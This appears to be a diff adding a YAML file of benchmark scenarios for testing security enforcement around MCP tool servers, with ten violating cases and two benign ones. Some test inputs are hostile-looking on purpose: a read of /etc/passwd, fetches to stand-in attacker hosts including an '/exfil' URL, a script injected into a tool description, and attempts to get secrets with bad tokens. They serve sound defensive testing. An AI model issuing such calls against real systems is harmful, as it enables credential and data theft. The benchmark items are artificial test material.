@@ -1,0 +1,204 @@
+# MCP Benchmark Scenarios
+# 10 violating + 2 benign (12 total)
+# Each has: id, description, transport, violating, component, lifecycle_phase, evidence_kind, failure_mode
+# Plus transport-specific fields: command/args/env for stdio, url/headers for http
+
+scenarios:
+
+  # --- VIOLATING ---
+
+  - id: S1
+    description: "Over-broad file scope: read_file with absolute path /"
+    transport: stdio
+    violating: true
+    component: scope
+    lifecycle_phase: runtime
+    failure_mode: over_broad_file_scope
+    evidence_kind: policy_violation
+    command: python
+    args: ["servers/file_stdio_server/server.py"]
+    env: {}
+    tool: read_file
+    tool_args:
+      path: "/etc/passwd"
+
+  - id: S2
+    description: "Egress-policy denial: outbound fetch to blocklisted host (evil.example.org)"
+    transport: http
+    violating: true
+    component: scope
+    lifecycle_phase: runtime
+    failure_mode: egress_policy_denial
+    evidence_kind: policy_violation
+    url: "http://127.0.0.1:8001/mcp"
+    headers: {}
+    tool: fetch_url
+    tool_args:
+      url: "https://evil.example.org/data"
+
+  - id: S3
+    description: "Poisoned tool metadata: description contains script injection"
+    transport: stdio
+    violating: true
+    component: metadata
+    lifecycle_phase: discovery
+    failure_mode: poisoned_tool_description
+    evidence_kind: metadata_violation
+    command: python
+    args: ["servers/file_stdio_server/server.py"]
+    env: {}
+    tool: read_file
+    tool_args:
+      path: "hello.txt"
+    metadata_check:
+      inject_description: "<script>alert(1)</script> Read a file"
+      expect_violation: true
+
+  - id: S4
+    description: "Admission check: tool hash not in approved set — unapproved tool rejected at registration"
+    transport: stdio
+    violating: true
+    component: integrity
+    lifecycle_phase: admission
+    failure_mode: unapproved_tool_at_admission
+    evidence_kind: hash_mismatch
+    command: python
+    args: ["servers/file_stdio_server/server.py"]
+    env: {}
+    tool: read_file
+    tool_args:
+      path: "hello.txt"
+    integrity_check:
+      expected_hash: "WRONG_HASH_AAAA1111"
+      resource_uri: "tool-integrity://hash"
+
+  - id: S5
+    description: "Out-of-scope token: token has wrong scope for get_secret"
+    transport: http
+    violating: true
+    component: authz
+    lifecycle_phase: runtime
+    failure_mode: out_of_scope_token
+    evidence_kind: authz_denied
+    url: "http://127.0.0.1:8002/mcp"
+    headers:
+      Authorization: "Bearer scope-limited-token-xyz"
+    tool: get_secret
+    tool_args:
+      key: "db_password"
+
+  - id: S6
+    description: "Unauthorized principal: blacklisted user attempts get_secret"
+    transport: http
+    violating: true
+    component: authz
+    lifecycle_phase: runtime
+    failure_mode: unauthorized_principal
+    evidence_kind: authz_denied
+    url: "http://127.0.0.1:8002/mcp"
+    headers:
+      Authorization: "Bearer unauthorized-token-000"
+    tool: get_secret
+    tool_args:
+      key: "api_key"
+
+  - id: S7
+    description: "Post-approval drift: tool definition modified after approval, hash diverged from registered value"
+    transport: stdio
+    violating: true
+    component: integrity
+    lifecycle_phase: admission
+    failure_mode: tool_drifted_after_approval
+    evidence_kind: hash_mismatch
+    command: python
+    args: ["servers/file_stdio_server/server.py"]
+    env: {}
+    tool: read_file
+    tool_args:
+      path: "hello.txt"
+    integrity_check:
+      expected_hash: "APPROVED_HASH_CCCC3333"
+      resource_uri: "tool-integrity://hash"
+
+  - id: S8
+    description: "Observability gap: real egress denial occurs but server is configured not to emit the denial trace artifact"
+    transport: http
+    violating: true
+    component: observability
+    lifecycle_phase: observability
+    failure_mode: missing_server_trace
+    evidence_kind: observability_gap
+    url: "http://127.0.0.1:8003/mcp"
+    headers: {}
+    tool: fetch_url
+    tool_args:
+      url: "https://malicious.attacker.io/exfil"
+    observability_check: true
+    server_trace_dir: "evidence/server_traces_s8"
+
+  # --- DIVERGENCE SCENARIOS (expose gap between modes) ---
+
+  - id: S11
+    description: "Integrity drift detected at runtime — naive phase inference maps HASH_MISMATCH to admission, GT phase is runtime"
+    transport: stdio
+    violating: true
+    component: integrity
+    lifecycle_phase: runtime
+    failure_mode: integrity_drift_detected_at_runtime
+    evidence_kind: hash_mismatch
+    command: python
+    args: ["servers/file_stdio_server/server.py"]
+    env: {}
+    tool: read_file
+    tool_args:
+      path: "hello.txt"
+    integrity_check:
+      expected_hash: "RUNTIME_DRIFT_HASH_9999"
+      resource_uri: "tool-integrity://hash"
+
+  - id: S12
+    description: "Overbroad scope surfaces as authz denial — naive component inference maps AUTHZ_DENIED to authz, GT component is scope"
+    transport: http
+    violating: true
+    component: scope
+    lifecycle_phase: runtime
+    failure_mode: overbroad_scope_manifests_as_authz_denial
+    evidence_kind: authz_denied
+    url: "http://127.0.0.1:8002/mcp"
+    headers:
+      Authorization: "Bearer scope-limited-token-xyz"
+    tool: get_secret
+    tool_args:
+      key: "api_key"
+
+  # --- BENIGN ---
+
+  - id: S9
+    description: "Approved tool with valid scope, identity, and metadata"
+    transport: stdio
+    violating: false
+    component: scope
+    lifecycle_phase: runtime
+    failure_mode: none
+    evidence_kind: clean_execution
+    command: python
+    args: ["servers/file_stdio_server/server.py"]
+    env: {}
+    tool: read_file
+    tool_args:
+      path: "hello.txt"
+
+  - id: S10
+    description: "Authorized HTTP call with valid token, complete logs and traces"
+    transport: http
+    violating: false
+    component: authz
+    lifecycle_phase: runtime
+    failure_mode: none
+    evidence_kind: clean_execution
+    url: "http://127.0.0.1:8002/mcp"
+    headers:
+      Authorization: "Bearer valid-token-abc123"
+    tool: get_secret
+    tool_args:
+      key: "db_password"
